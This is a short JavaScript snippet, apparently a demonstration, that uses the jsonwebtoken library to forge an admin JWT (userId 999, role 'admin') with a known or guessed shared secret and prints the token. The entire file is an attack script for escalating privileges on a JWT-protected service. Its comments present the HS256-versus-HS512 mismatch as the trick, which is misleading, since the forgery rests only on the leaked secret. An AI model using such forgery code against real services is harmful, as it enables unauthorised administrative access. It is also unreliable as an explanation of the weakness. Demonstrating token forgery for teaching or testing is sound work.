import jwt from "jsonwebtoken";

// attacker knows or guesses your secret
const SECRET = "the_quick_brown_foxjh_jumps_over_the_lazy_dog";

// attacker creates fake admin token using DIFFERENT algorithm
const forgedToken = jwt.sign(
  {
    userId: 999,
    role: "admin",
    hacked: true,
  },
  SECRET,
  {
    algorithm: "HS256", // different from your server (HS512)
    expiresIn: "1h",
  }
);

console.log("\nFORGED TOKEN:\n");
console.log(forgedToken);